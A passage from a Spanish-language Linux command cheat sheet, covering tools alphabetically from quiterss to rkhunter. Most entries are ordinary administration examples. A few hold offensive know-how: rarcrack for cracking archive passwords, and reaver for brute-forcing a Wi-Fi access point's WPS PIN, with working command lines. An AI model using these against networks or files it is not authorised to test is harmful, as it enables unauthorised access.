Nota.- Si se tiene alguna de estas dos terminales desplegables y se quiere compaginar con qterminal ha de modificarse el lanzamiento de F12 por otro en las preferencias.


quiterss
Lector de noticias.
Algunos atajos:
+ (Suguiente noticia sin leer)
- (Anterior noticia sin leer)
Ctrl+r (Marcar canal como leído)
Ctrl+R (Marcar todos los canales como leídos)
Ctrl+Flechas arriba/abajo (Subir/bajar canal)
Flechas derecha/izquierda (Subir/bajar noticias)
espacio (Abrir en una pestaña)
Ctrl+o (Abrir en el navegador externo)
Ctrl+w (Cerrar pestaña)
F5 (Actualizar canal)
Ctrl+F5 (Actualizar todos los canales)
F8 (Abrir opciones)
Ctrl+q (Salir)


quiz
Pruebas de conocimiento al azar [en inglés]
$ quiz (Listara los temas posibles)
$ quiz Europe capital (Preguntará capitales de Europa. Si no se sabe la respuesta pulsar intro en blanco y mostrará la respuesta)


quota
[quotatool]. Limitar el uso del espacio de disco para cada usuario de un servidor. El proceso es como sigue:
# nano /etc/fstab
Modificar la linea parecida a:
	/dev/hdb2    /home    ext2    errors=remount-ro   0    1
añadiendo usrquota y grpquota com sigue:
	/dev/hdb2    /home    ext2    errors=remount-ro,usrquota,grpquota  0    1
Reiniciar el servidor.
# quotacheck -avug (La primera vez muestra advertencia, prescindir de ellas)
# quotaon /home (Activar las cuotas)
# edquota USER1 (activar cuotas para un usuario)
# edquota -p USER1 USER2 (Otorgar a USER2 la misma cuota que USER1)
# quota USER2 (Comprobar si un usuario tiene cuota)


quotacheck
[quota quotatool]. Cuando una máquina la usan varios usuarios o grupos y queremos controlar el espacio usado por cada uno de ellos, tenemos la opción de activar el sistema de quotas a nivel de sistema de ficheros de modo que podamos personalizar por usuario y grupo el espacio máximo o número de inodos que pueden utilizar.
# quotacheck -c -u usuario (comprobar si un usuario tiene quotas)
# quotacheck -cgumv / (mirar qi existen quotas en la raiz)
Los parámetros son:
    -c  (Escaneo del sistema de ficheros en busca de quotas)
    -g  (Busca quotas de grupos)
    -u  (Busca quotas de usuarios)
    -m  (No intenta hacer un remount en sistemas read-only)
    -v  (Verbose)


radeontop
Utilidad para ver el uso de GPU detallado por componentes y el uso de VRAM de targetas gráficas ATi/AMD Radeon a partir de R600
$ radeontop


rain
[bsdgames]. Muestra chapoteo de agua en la terminal.
$ rain -d 120 (El máximo de lento. Por defecto 0 [rápido])


rails
Proporciona estructuras estándar para bases de datos, servidores web y sitios web. Precisa varias dependencias rvm, rbenv, postgress, algunos paquetes ruby...
$ rails new ~/weblog
$ cd weblog
$ rails s -b localhost -p 3000
$ firefox localhost:3000 (para ver eñ resultado)


ramfs
Permite asignar parte de la memoria física para ser utilizada como una partición lo que permite una vez montada, leer o escribir archivos de la RAM como si de una partición de disco se tratara. Dado que se está escribiendo en la memoria RAM del sistema, esta se borra en un reinicio o en un cuelgue. Relacionado con tmpfs [ver], se diferencia de este en que ramfs no usa swap y que si se supera la RAM del sistema, se bloquea. El proceso:
# mkdir /media/ram
# mount -t ramfs -o size=20m ramfs /media/ram
Comprobar con df -k [ver] o mount [ver]su correcto montaje


randmac
imprime una dirección MAC aleatoria para interfaces de máquinas virtuales.
$ randmac -l -e (local y con dirección EUI64)
$ randmac -g -u (global y para unicast)
$ randmac -U -m (para multidifusión y dígitos hexadecimales en mayúsculas)


random
Función interna de Bash que devuelve un número entero pseudoaleatorio en el rango: 0 - 32767. Para establecer un límite superior se utiliza la función módulo [%] y para un número inferior se le suma el propio número inferior.
$ echo $RANDOM (Cualquier número aleatorio dentro del rango)
$ echo $((RANDOM%20)) (Obtener un número de 0 a 20)
$ echo $((5+RANDOM%15)) (Obtener un número de 5 a 15)
$ VARIABLE=`echo $(($RANDOM))`


randtype
Utilidad para leer un archivo y mostrar la salida carácter por carácter o línea por línea a intervalos aleatorios.
$ randtype archivo (forma básica con valores por defecto)
$ randtype -t 10,100000 archivo (Retarda la salida de forma aleatoria entre 10 y 100000 microsegundos)
$ echo "Linux es un sistema genial" | randtype -m 4 (Simulando 4 errores en el tecleo de la frase)


ranger
[caca-utils highlight atool w3m poppler-utils mediainfo]. Navegador de archivos estilo vim [ver]. Preferible lanzarlo sobre xterm o urxvt. Algunos temas en < http://dotshare.it/category/fms/ranger/> . El directorio de temas está en /usr/lib/python2.6/dist-packages/ranger/colorschemes [puede ser tambien python2.7] y los nuevos temas pueden colocarse en .config/ranger/colorschemes/ [Si no existe se crea] .Antes de la primera configuración lanzar:
$ ranger (Creará los archivos necesarios en .config/ranger)
$ ranger --copy-config=all (Copiar configuración básica en el directorio creado)
Los ajustes en:
$ nano .config/ranger/options.py
Nota.- En algunas versiones en .config/ranger/rc.conf
Para modificar el tema:
	colorscheme = 'jungle'
Para bordes en los campos:
	draw_borders = True
Algunos atajos:
	gg (Ir al principio del directorio)
	G (Ir al final del directorio)
	s (Arranca una shell en el directorio actual)
    s -w comando (mostrará la salida de "comando y no cerrará la shell hasta pulsar intro)
    s -r comando (Pedirá la contraseña para ejecutar "comando")
	yy [F5] (copiar selección)
	dd [F6] (Cortar selección)
	pp (Pegar selección)
	ma (crea un marcador del presente directorio con el nombre "a")
	'a (Ir al directorio con marcador "a")
	uv (Suprimir todas las marcas de archivos)
	m (abre marcadores)
	Espacio (marcar archivo desplazándolo un espacio en el listado)
	gn (Abrir nueva pestaña. El número de pestañas se muestra en la parte superior derecha)
	gt [TAB] (Cambiar de pestaña)
	gc (Cerrar una pestaña)
	:delete (borrar un archivo)
	:rename (renombrar un archivo)
	r (Abre el archivo con una aplicacion a elegir)
	Ctrl+H (Mostrar/ocultar archivos ocultos)
	/ (buscar archivo en el presente directorio)
	? [F1] (Ver la pagina man)
	1? (Listado de atajos de teclado)
	2? (Comandos de ayuda)
	3? (Herramientas de ayuda)
	F3 (Mostrar archivo.Nueva pulsación de F3 salir)
	F4 (Editar archivo)
	F7 (Crear directorio)
	F8 Suprimir selección de archivos
	R (Actualizar directorio)
	! (Entrar comandos de shell)
	Ctrl+z (Salir a la shell. "fg" para volver a ranger)
	Q [F10](salir)


rankmirrors
Optimiza los mirrors de pacman.
# cp mirrorlist mirrorlist.backup
# rankmirrors mirrorlist.backup >> mirrorlist


ranlib
Genera un índice del contenido de un archivo y lo almacena en el archivo. El programa ranlib es otra forma de GNU ar [ver]; ejecutar ranlib es completamente equivalente a ejecutar ar -s.


rar
Empaqueta y comprime
$ rar a archivo.rar fichero1 fichero2  (Comprimir varios ficheros)
$ rar x archivo.rar  (Descomprimir)
$ rar v archivo.rar (Ver contenido)
$ rar a archivo.rar fichero -hp   (empaquetar un fichero con contraseña)
$ rar a archivo.rar file1 file2 dir1 (comprimir varios ficheros y directorios simultáneamente)


rarcrak
Crequear archivos encriptados y descifrador de contraseñas para archivos rar, zip y 7z.
$ rarcrack --type zip file.zip ()
$ rarcrack --threads 6 file.rar (utilizar 6 subprocesos)


rarp
Manipula la tabla rarp del nucleo.
$ rarp -a (Lista las entradas de la caché si el nucleo tiene soporte rarp)
$ rarp -d hostname (Elimina una entrada de la caché)


raspi-config
Acceso a los parámetros de configuración de la placa RaspberriPi


ratpoison
Es un administrador de ventanas simple, sin gráficos sofisticados, sin decoraciones en las ventanas y sin dependencia de mouse. Está inspirado en gran medida en GNU Screen. La pantalla se puede dividir en cuadros que no se superpongan. Todas las ventanas se mantienen maximizadas dentro de sus marcos para aprovechar al máximo el valioso espacio de su pantalla. Toda la interacción con el administrador de ventanas se realiza mediante pulsaciones de teclas. ratpoison tiene un mapa de prefijos para minimizar la manipulación de teclas.
# startx $(which ratpoison) (arrancar el administrador de ventanas)
Teclas útiles
C-t . (menú)
C-t ? (ayuda)
C-t c (abrir una terminal)
C-t a (visualización de la fecha)
C-t w (listar todas las ventanas)
C-t A (establece título de la ventana)
C-t k (mata la ventana actual)
C-t ! (ejecutar un comando de shell)
C-t ' (seleccionar ventana por número o el comienzo de su nombre sin distingue entre mayúsculas y minúsculas)
C-t 1 (ir a la ventana número 1. Lo mismo para con los números de 2 al 9)
C-t s (dividir marco horizontalmente)
C-t S (dividir marco verticalmente)
C-t Tab (cambia el foco a la siguiente ventana en el marco)
C-t Q (hacer que la ventana enfocada actual sea la única en el marco)
C-t r (cambiar tamaño del marco usando las teclas del cursor y enter)
C-t R (eliminar la ventana actual del marco)
C-t f (seleccionar una ventana en el marco actual usando números)
C-t u (deshacer un comando anterior)
C-t U (rehacer el comando deshecho)
C-t x (intercambiar la ventana actual con una seleccionada por otra en el cuadro actual)
C-t F (muestra la ventana actual)
C-t C-t (va al último frame)
C-t : comando (ejecutar un comando que tambien puede agregarse al archivo ~/.ratpoisonrc)
C-t b (destierra el mouse a una esquina de la pantalla)
C-t F9 (salir de ratpoison)
Los comandos ratpoison con C-t :
1. set (muestra toda la configuración)
2. bind (asocia una tecla a un comando. Si la tecla ya está ocupada , primero se ha de ejecutar el comando unbind)
3. bargravity ne (hace que la ventana barra se muestre en la esquina superior derecha. Otros valores: nw, se, sw)
4. tmpwm (permite lanzar un gestor de ventanas temporal. P.ej: para ejecutar la aplicación gimp)
5. number (cambia el número de la ventana)
6. select (selecciona una ventana mediante su número o el comienzo de su nombre. No distingue entre mayúsculas y minúsculas)
7. exec (ejecuta un programa en un proceso diferente)
8. msgwait (número de segundos que se muestra la salida de un comando en la pantalla)


rbash
shell restringido. Se usa para imponer a un usuario un entorno severamente limitado en el que, por ejemplo, no podrá cambiar de directorio [cd], especificar nombre que contengan la /, redirigir la salida usando operadores de redirección [>, <, >>], reemplazar la shell, desactivar el modo restringido, etc. Equivalente a "bash -c"
# adduser -s /bin/rbash juan (Crear un usuario con shell restringido)
# usermod -s /bin/rbash juan (Modificar la shell de un usuario ya establecido)
Si queremos ampliar la cantidad de comandos a disposición de un usuario limitado editamos de su directorio personal el archivo .bash_profile:
# nano .bash_profile
Y añadimos o modificamos las siguientes lineas:
    PATH=$HOME/apps
    export PATH
Creamos el directorio
# mkdir /home/juan/apps
Y añadimos enlaces de los binarios que queramos permitir al usuario [en este caso ls, cp y cat]
# ln -s /bin/ls /home/juan/apps/
# ln -s /bin/cp /home/juan/apps/
# ln -s /bin/cat /home/juan/apps/
Y bloqueamos el archivo:
# chattr +i /home/juan/.bash_profile


rbenv
Permite cambiar entre múltiples versiones de Ruby. Entrar en .bashrc la linea:
        eval "$(~/.rbenv/bin/rbenv init - bash)"
$ rbenv init
$ rbenv commands (listar todos los comandos disponibles)


rcconf
Parar/arrancar procesos durante el inicio
$ rcconf -now


rc.d
Inicia o para servicios en Arch Linux
# rc.d start servicio (inicia el demonio o servicio)
# rc.d restart servicio (Reinicia el demonio)
# rc.d stop servicio (Para el servicio)


rdesktop
Conexión a escritorio remoto.
$ rdesktop -k es -g 1024×768 -u USER -p PASS -a 15 -T tux -D client (Especificando teclado español [k], medidas de la ventana [g], usuario [u] y contraseña [p], especificar un mobre para la ventana [T] y suprimiendo la decoración de la ventana [D])


rdfind
programa para buscar archivos duplicados y, opcionalmente, enumerarlos, eliminarlos o reemplazarlos con enlaces simbólicos o físicos.  Si se encuentran dos (o más) archivos iguales, el programa decide cuál de ellos es el original y el resto se consideran duplicados.  De forma predeterminada, no se realiza ninguna acción aparte de crear un archivo con los archivos detectados
$ rdfind -deleteduplicates true ~/Documents (eliminar duplicacdos del directorio especificado)
$ rdfind /home/USER /home/USER/Documents


rdiff
Compara archivos y directorios y crea diferencias binarias [delta] basadas en firmas [signature]. Al aprovechar el algoritmo delta remoto de rsync, no es necesario que el archivo de origen esté en la misma ubicación que el archivo de destino.
El proceso es el siguiente:
Se tiene dos archivos iguales en dos directorios ditintos. Se genera una "firma" del archivo de un directorio [signature.sig] y se copia en la misma ubicación que el archivo que modificaremos. Una vez modificado, generamos el delta que describe los cambios necesarios para convertir el archivo de origen en el archivo modificado a partir de la signature.sig y se genera el archivo delta.diff. Este archivo se copia a la carpeta donde está el archivo no modificado y se "patchea" para convertir el archivo igual que el del directorio que se ha modificado.
$ rdiff signature file.txt signature.sig (crear una firma del archivo original)
$ rdiff delta signature.sig file.txt delta.diff (despues de una modificación en file.txt crear delta.diff con las direfencias a partir de la signature.sig del paso anterior)
$ rdiff patch original.txt delta.diff reconstruido.txt (recontruir el archivo original con la modificación a partir del delta.diff generado en el paso anterior)


rdiff-backup
Backups incrementales locales o remotos. La aplicación ha de estar instalada en el cliente y en el servidor.
$ rdiff-backup --force 192.168.1.20::/home/USER/dir_remoto /home/USER/dir_local (Realiza un backup del dir_remota de la máquina 20 de la red y lo guarda en nuestro dir_local sin comprimir)
$ rdiff-backup /home/USER /media/datos/Backups/home_user.backup (Un backup de un directorio personal)
$ rdiff-backup -r 5D Documents/backup/ file_restaura/ (restaurar archivos antiguos [de 5 dias antes])


rdiffdir
[duplicity]. Calcular, aplicar firmas y comparar directorios [estructura y metadatos].
$ rdiffdir dir1 dir2 > diferencies.dir
$ cat diferencies.dir (para ver el archivo de las diferencias)


read
Espera una entrada por teclado y le asigna una variable, aunque contenga espacios.
	$ read -p "dime tu nombre " NOMBRE
	$ echo $NOMBRE
La opción "p" tambien permite entrar varias variables simultaneamente y la -t espera 10 segundos las entradas antes de volver al prompt:
	$ read -t 10 -p "entra 3 nombres" PRIMERO SEGUNDO TERCERO
	$ echo "Hola $PRIMERO $SEGUNDO $TERCERO"
La opción -a permite leer las palabras como elementos de un array:
	$ read -a frase
	Hola que tal
	$ declare -p frase
	declare -a frase='([0]="Hola" [1]="que" [2]="tal")'
$ read -s -p "entra la contraseña: " CONTRASEÑA (-s --> Para que no se vea en la pantalla lo que se escribe aunque si se efectua un echo $CONTRASEÑA se mostrará)
$ read -n 1 -p "¿continuar? "  (efectuará la acción al pulsar una tecla sin necesidad de pulsar "Intro")
1.-
$ read x y <<<"2 5"
$ echo "x=$x -- y=$y"
x=2 -- y=5
Algunas opciones:
-d (permite indicar un delimitador de fin de línea de forma que la línea se lee hasta encontrar este delimitador)
-e (permite que se puedan usar todas las combinaciones de teclas de readline)


read-edid
Herramienta de recopilación de información de hardware para monitores VESA PnP. read-edid consta de dos herramientas: get-edid, para  leer una estructura EDID de latarjeta gráfica y recuperar la información del monitor a través del Canal de visualización de datos [DDC - Data Display Channel] y parse-edid que analiza esta estructura de datos y genera datos adecuados para su inclusión en el archivo de configuración XFree86 o X.org.
# get-edid | edid-decode (primero obtener la información EDID del monitor y luego la pasa a edid-decode, que la decodifica y muestra en un formato legible)
# get-edid | parse-edid


readlink
Muestra donde apunta un enlace simbólico.
$ readlink enlace
$ readlink -f enlace (Muestra el path absoluto)
$ readlink /proc/$$/ns/{mnt,net,pid,user,uts,ipc,cgroup} (descubrir los inodos de namespaces del shell actual)


readonly
Permite declarar variables de solo lectura [No modificables].
$ readonly -p (Las muestra todas)
$ readonly -f var (Crear la funcion "var" de solo lectura)
$ readonly -r var (Quita el atributo de "solo lectura" pero no permite redefinirla)


readpst
Herramienta para convertir base de datos de Outlook en PST a eml para su posterior exportación a Thunderbird
$ readpst -o  -r miarchivo.pst
$ readpst -M -b -e -o carpeta-destino miarchivo.pst (Generará los archivos EML en la carpeta-destino)


really
[chiark-really]. Programa que permite a ciertos usuarios convertirse en el usuario que deseen si así lo solicitan. Es un poco como sudo en ese aspecto. A diferencia de sudo, no pretende que la cuenta llamada pueda ser más segura que la cuenta que llama, por lo que nunca es necesaria una contraseña. Además, a diferencia de sudo, solo funciona si se supone que el usuario que llama es equivalente a root. Pero, también puede ser utilizado por usuarios equivalentes a root para convertirse en cualquier usuario, no solo root; de esta manera, puede ser un reemplazo para ciertos usos de su [ver].
# really -u USER (establece el uid, gid y la lista de grupos suplementarios de USER en las bases de datos de contraseñas y grupos)
# really -i USER (establece únicamente el uid según la entrada del nombre_usuario en la base de datos de contraseñas)
# really -g GRUPO (busca en la base de datos de grupos y su gid se añade a la lista de grupos suplementarios del proceso)
# really -R ~/dir (establece el directorio raiz del proceso)


realpath
Muestra el path real de un enlace, un fichero o un directorio.
$ realpath -P Musica (si es un enlace)
$ realpath -e archivo (de un archivo)


reaver
Herramienta que lleva a cabo un ataque de fuerza bruta contra el número pin de la configuración protegida de un punto de acceso wifi. Precisa poner nuestra targeta en modo monitor (airmon-ng start wlan0)
# reaver -i mon0 -b 00:01:02:03:04:05 (Mínimo requerido, especificar nombre de la interfaz y BBSID)
Algunas opciones:
	--fixed (Fijando canal de la interfaz)
	-t 2 (Tiempo de espera de la recepción de paquetes. Por defecto 5)
	-d 0 (Desactivar tiempo de espera entre pins. Por defecto 1 segundo)
	-vv (Incrementar el nivel de detalle)


reboot
Reiniciar el sistema.
$ reboot -f (Fonzandolo)


recap
Vuelca información periódica sobre la ejecución de aplicaciones y el uso de recursos. Se almacena en el archivo /var/log/recap/recap.log. Los valores para los que se generan los informes y cuántos informes se almacenan se pueden especificar en /etc/recap.conf.


recaplog
[recap]. Maneja los registros generados por recap, comprimiendo y/o borrando los archivos de registro de /var/log/recap/recap.log
# recaplog -n


recaptool
[recap]. Analiza los registros e imprime información específica sobre la memoria, los procesos, las conexiones de red o las consultas a una base de datos mysql.
# recaptool -b ssh (la memoria del servicio ssh)
# recaptool -e 80 (del puerto 80)
# recaptool -q (de la base de datos mysql)
# recaptool -m http -e 80 -q (del servicio html del puerto 80 y la base de datos mysql)


recode
Convierte archivos a distintos formatos de caracteres
$ recode -l | less	(listado de conversiones disponibles)
$ recode iso8859-15..utf8 file.txt (cambiar caracteres iso... a utf.. de file.txt
$ recode iso8859-15../b64 file.txt (de caracteres iso.. a codificacion base64)
$ recode -lf iso8859-15 | grep euro  (buscar tabla de caracteres)
$ cat file.txt | recode ISO_8859-1..UTF8 > nuevo.txt (De iso8859-1 a utf-8 )
$ recode ..HTML < file.txt > file.html  (pasar un texto a html)


recordmydesktop
Grabar el escritorio.
$ recordmydesktop -o video.ogv (Especificando nombre del archivo de salida. Si no consta por defecto es out.ogv)
$ recordmydesktop --no-cursor (Sin grabar el cursor)
$ recordmydesktop --follow-mouse (La brabación sigue al cursor)
$ recordmydesktop --device pulse (Especificando dispositivo de sonido)


red
1.- Configurar IP fija
# nano /etc/network/interfaces
Borrar todo el contenido y susbtituirlo por:
	auto lo
	iface lo inet loopback
	auto eth0
	iface eth0 inet static
	address 192.168.1.10 # IP estática
	netmask 255.255.255.0 # Mascara
	gateway 192.168.1.1 # IP del router
Reiniciar red:
# /etc/init.d/networking restart


redireccionar
Permite direccionar las salidas por pantalla a un archivo.
$ pwd > archivo.txt (mandar la salida de un comando a un archivo. Si archivo.txt existe borra todo el contenido anterior)
$ pwd 1> archivo.txt (lo mismo que el anterior)
$ pwd >> archivo.txt (añadir la salida de un comando a un archivo. Si no existe lo crea)
$ pwd 1>> archivo.txt (lo mismo que el anterior)
$ ls -W 2> error.txt (mandar la salida de errores a un archivo)
$ find / -name passwd 1> si.txt 2> no.txt (mandar la salida estandar a un fichero y la salida de errores a otro)
$ pwd >| archivo.txt (si la opción noclobber [ver] está activada)
$ mail usuario < archivo.txt (mandar un archivo a un usuario por mail)
$ find / -name passwd 1> todo.txt 2>&1 (mandar salida y errores a un mismo archivo)
$ find / -name passwd 2> todo.txt 1>&2 (lo mismo que el anterior)


ree
Verifica si el firmware del pc y la tarjeta de red puede arrancar la máquina en red.
# strings *.rom | grep UNDI > /dev/null && echo "Si puede" || echo No
# ree


reflector
Optimizador del mirrorlist de pacman.
# reflector (Mostrará todos los mirrors de archlinux.org/mirrors/status/json/)
# reflector --sort rate -l 10 -f 5 --save /etc/pacman.d/mirrorlist (Que tome los 5 mejores [f] de los 10 más actualizados [l], los ordene por velocidad de descarga [sort] y que sobreescriba el archivo mirrorlist [save])


regionset
Los discos dvd contienen un código que indica la región geográfica donde el dvd fue publicado imposibilitando que los comprados en unas regiones, puedan reproducirse en otras:
Códigos de región:
	1 Norte América (USA y Canadá)
	2 Europa, Medio-oriente, Sudáfrica y Japón
	3 Sudeste Asiático, Taiwan, Corea
	4 Hispano América, Brasil, Australia, Nueva Zelanda
	5 Antigua URSS (Rusia, Ucrania, etc.), resto de África, India
	6 China
Esta aplicación permite cambiar dicho código del reproductor, no en el disco dvd y en la mayoría de los casos sólo permite hacer 5 cambios y en algunos casos, sólo 2.
# regionset
	regionset version 0.1 -- reads/sets region code on DVD drives
	Current Region Code settings:
	RPC Phase: II
	type: NONE
	vendor resets available: 4
	user controlled changes resets available: 5
	drive plays discs from region(s):, mask=0xFF
	Would you like to change the region setting of your drive? [y/n]:
vendor resets available: 4 (indica el número de cambios disponibles)


reiserfsck
Reparación de particiones reiserfs. Equivalente al fsck -f /dev/sdX de las particiones ext3.
# reiserfsck --rebuild-tree /dev/sda


reisub
Combinación de teclas a usar cuando el sistema se cuelga. Pulsar las teclas  Alt+ImprPant [PetSis] y mientras mantenemos las dos teclas pulsadas teclear la combinación de teclas REISUB. Su significado:
R: Retorna el control al teclado y ratón.
E: Envia a todos los procesos la señal TERM.
I: Envia a todos los procesos la señal KILL.
S: Sincroniza sistemas y unidades montadas.
U: Desmonta todos los sistemas de archivos.
B: Reinicia la máquina.


remove-shell
[debianutils]. Elimina shells de la lista de shells de inicio de sesión. Funciona en los archivos temporales /etc/shells.tmp y /etc/shells.tmp2 para eliminar los shells dados de la lista de shells válidos y copia el resultado en /etc/shells.
$ remove-shell rbash


rename
renombrar archivos
$ rename JPG jpg *.JPG (Renombrará todos los xxxx.JPG a xxxx.jpg)
1.-
Substituir parte del nombre de unos archivos ("DSC") por otro ("Fotos")
	$ ls
	DSC_8362.jpg DSC_8374.jpg  DSC_8378.jpg  DSC_9112.jpg
	$ rename 's/DSC/Fotos/' *.jpg
	$ ls
	Fotos_8362.jpg Fotos_8374.jpg Fotos_8378.jpg Fotos_9112.jpg


renice
(Ver nice). Cambiar la prioridad de un proceso en marcha.
# renice -10 PID


replace
Reemplazar letras o palabras de ficheros.
$ replace a A -- archivo1 archivo2 (“a” por “A” en los dos ficheros)
$ replace files DIRS  --  archivo (“files” por “DIRS” en archivo)
$ replace DIRS dirs files FILES -- archivo (“DIRS” por ”dirs” y “files” por “FILES”)


reportbug
Herramienta diseñada para enviar informes de errores a Debian o a las distribuciones derivadas. reportbug está diseñado para usarse en sistemas con un agente de transporte de correo instalado, como exim o sendmail; sin embargo, puede editarse el archivo de configuración y enviar informes utilizando cualquier servidor de correo disponible.
# reportbug lynx-ssl (Informa un error en el paquete lynx-ssl)
# reportbug --path --filename=ls (Informa un error en el paquete instalado que incluye un programa en su ruta llamado ls)


reptyr
Mueve procesos entre terminales ptys.
$ reptyr -L PID (cambio de terminal en un modo "lento" para mayor compatibilidad con procesos que podrían bloquearse)


reset
Restablece la configuración de la terminal cuando al intentar abrir algún fichero se nos ha llenado de caracteres raros. Aunque no veamos el cursor o el prompt, tecleando "reset" y clicar "intro", se restablece la terminal.


resize
Ver las columnas y líneas de la consola.
$ resize


resize2fs
Cambiar la medida de una partición.
# resize2fs /dev/sda3 600M
# resize2fs -p /dev/sda1 45288448K (Otro ejemplo pero que nos muestra el porcentage)


resolvconf
Framework para mantener actualizada la información del sistema sobre servidores de nombres. Se erige en intermediario entre programas que proporcionan esta información (como ifup y ifdown, clientes DHCP, el demonio PPP y servidores de nombres locales) y programas que utilizan esta información (como cachés DNS y bibliotecas de resolución).
$ resolvconf -i eth0 (interfaces y protocolos opcionalmente coincidiendo con el patrón)
$ resolvconf -l eth0 (enumera los archivos resolv.conf)
$ resolvconf -u (actualizar todos los suscriptores. No los actualiza cuando agrega un resolv.conf que coincide con lo que ya tiene para la interfaz)


resolvectl
[systemd-resolve]. Herramienta para la administración de DNSs [Domain Name Service, son los responsables de traducir los nombres de dominio a sus respectivas IPs y viceversa]
# resolvectl statistics (verificar estadísticas DNS)
# resolvectl flush-caches (Vacía todas las cachés de registros de recursos DNS que el servicio mantiene localmente)
# resolvectl status (configuración de DNS global actualmente vigente)
# resolvectl reset-statistics (establece a cero los contadores de estadísticas)
# resolvectl dns (mostrar las dns que se utilizan)
# resolvectl monitor (Mostrar flujo continuo de consultas de resolución de clientes locales y sus respuestas)


resolveip
Buscar el host de una ip o la ip de un host
$ resolveip -s www.google.com


restic
Programa que hace copias de seguridad de forma fácil, simple de configurar, rápido de ejecutar y restaurar, verificable, utiliza criptografíca para garantizar la confidencialidad y con el crecimiento de los datos, las instantáneas adicionales solo almacenan el incremento real.
$ restic init -r /tmp/prueba-restic (inicio del directorio del backup. Pide contraseña y confirmación)
$ restic -r /tmp/prueba-restic backup . (realizar el backup del presente directorio en el especificado con el init. Pide contraseña)
$ restic -r /tmp/prueba-restic snapshots (ver el contenido del directorio de los backups. Pide contraseña)
$ restic -r /tmp/prueba-restic backup . --exclude="*.sh" --exclude-file=logs.txt (excluyendo los .sh y logs.txt)
$ restic -r /srv/prueba-restic diff 9fb7d0ca 3bec06c1 (comparando las diferencias entre dos snapshots)
$ restic -r /tmp/prueba-restic restore 9d0c9446 --target /tmp/restore/ (restaurar un backup en el directorio especificado)


restore
Restaurar una copia de seguridad realizada con dump.
$  restore -rf home.bak (restaurar la copia completa [r] del archivo especificado [f])
$ restore -xaf fichero.bak fichero (restaurar solo la copia del fichero indicado [x], sin preguntar de qué volumen extraer los ficheros y especificando  archivo  [f])


return
Comando builtin [integrado] de la shell Bash y de otras compatibles que se utiliza dentro de funciones definidas en scripts de shell para finalizar la ejecución de la función y, opcionalmente, devolver un valor de retorno, un número entero entre 0 y 255. Este valor suele ser utilizado para indicar el estado o resultado de la función: éxito, error, etc.
Ejemplo de finalizar una función con un código específico y capturarlo usando $? tras llamar a la función.
        mi_funcion() {
            echo "Esto es la función"
            return 5
        }
        mi_funcion
        echo $


retty
Capturar el proceso que se está ejecutando en otra consola.
$ retty PID
Ejemplo.
En una consola lanzamos el proceso:
$ watch -tn1 'date "+%r %F %A"'
En otra averiguamos el PID:
$ ps aux | grep watch
Y capturamos el proceso:
$ retty PID


rev
invierte una cadena de texto o un archivo
$ echo "perico de los palotes" | rev
$ rev archivo.txt


rfkill
Herramienta para activar/desactivar dispositivos inalámbricos.
# rfkill list (Muestra listado y su estado)
# rfkill block all (bloquear todos [“all”], otras opciones: ”wifi”, “wlan”, “wimax” ….)
# rfkill unblock all (Desbloquear todos los dispositivos)
# rfkill unblock 0 (Desbloquear la 0 según resultado de “list”)


rig
[Random Identity Generator]. Genera datos personales aleatorios pero de apariencia real en inglés. Si se ha bajado de https://github.com/harkaitz/rig-spain el equivalente español ha de especificarse con -d.
$ rig -f -c 5 -d /usr/local/share/rig/spain (genero femenino, 5 opciones de identidad y en español)
$ rig -m -c 5 (del genero masculino y 5 opciones de identidad)


ripgrep
buscar palabras, archivos y directorios.
$ rg archivo.mp3
$ rg -A2 archivo.txt (muestra dos lineas despues de la coincidencia)
$ rg -C2 dir (muestra la línea anterior y posterior a la coincidencia)
$ rg rifftree $HOME (busca "rifftree" en toda la $HOME)


ripit
Crear archivos mp3 a partir de un cd de música.
$ ripit --device /dev/sr1 (especificando dispositivo)
$ ripit --normalize (Normalizar archivos antes de la codificación)
$ ripit 1,3-5,7-10 (extraer y codificar una selección de pista seleccionadas)
$ ripit --span 0-25 (Copiar solo los primeros 25 segundos de cada pista)


rkhunter
Buscador de rootkits instalados en el sistema. La aplicación, preferiblemente iniciarla con los dos comandos siguientes primero.
# rkhunter --update  (recargar la base de datos)
# rkhunter --propupd (si se ha modificado la función Hash o para reconstruir la base de datos y evitar "Warnings" tipo: Warning: The file properties have changed)
# rkhunter -c  (iniciar la aplicación)
# rkhunter -c --sk (iniciar la aplicación sin pedir confirmación para proseguir después de cada sección)
# rkhunter -c -sk --rwo (sin mostrar salida excepto los "Warnings")
# rkhunter --list (ver todas las opciones)
# rkhunter --list rootkits (ver el listado se rootkits que busca)
# rkhunter --list tests (listado de chequeos)
# rkhunter --enable group_accounts,system_commands  (solo chequear estas dos opciones)
# rkhunter --disable shared_libs  (descartar esta opción del chequeo)
# cat /var/log/rkhunter.log | grep Warning (visualizar los "Warnings")
# egrep -i "warning:|\[ warning \]" /var/log/rkhunter.log && awk '/System checks summary/ {f=1}f' /var/log/rkhunter.log (otra forma de visualizar "warnings")
# rkhunter -C (ver las últimas modificaciones del archivo de configuración /etc/rkhunter.conf)
1.-
Para solucionar el error: Warning: Hidden directory found: /etc/.java
# nano /etc/rkhunter.conf
Y descomentar la linea:
ALLOWHIDDENDIR="/etc/.java"
Nota.- para errores similares con archivos ocultos [/dev/.udev, /dev/.initramfs... ], descomentar la linea correspondiente.
2.-
Para errores de versión de ciertas aplicaciones [Warning: Application 'gpg', version ....]
# nano /etc/rkhunter.conf
Añadir apps a la linea:
DISABLE_TESTS="suspscan hidden_procs deleted_files packet_cap_apps apps"
3.-
Para suprimir falsa advertencias sobre posibles interfaces promiscuos [P.ejemplo de un servidor virtual], añadir "promisc" a la opción DISABLE_TESTS:
DISABLE_TESTS="suspscan hidden_procs deleted_files packet_cap_apps apps promisc"
4.-
Para que los valores se obtengan del gestor de paquetes correspondiente:
# nano /etc/rkhunter.conf
Y descomentar y modificar la linea PKGMGR:
PKGMGR=DPKG
Nota.- Otras opciones para distros no debian o para desactivar la opción: RPM, BSD,SOLARIS y NONE
5.-
Para evitar la nota: Warning: Suspicious file types found in /dev... añadir a /etc/rkhunter.conf la linea:
	ALLOWDEVFILE=/dev/.../*
Nota.- Substituir los puntos supensivos por el subdirectorio oportuno.
6.-
Evitar el error: Invalid BINDIR configuration option: Not a directory: /snap/bin/kesty-whatsapp
He suprimido el programa que lo causaba:
# snap remove kesty-whatsapp
O dicen que suprimir la ruta al ejecutable /snap/bin/kesty-whatsapp que la tengo en .bashrc
7.-
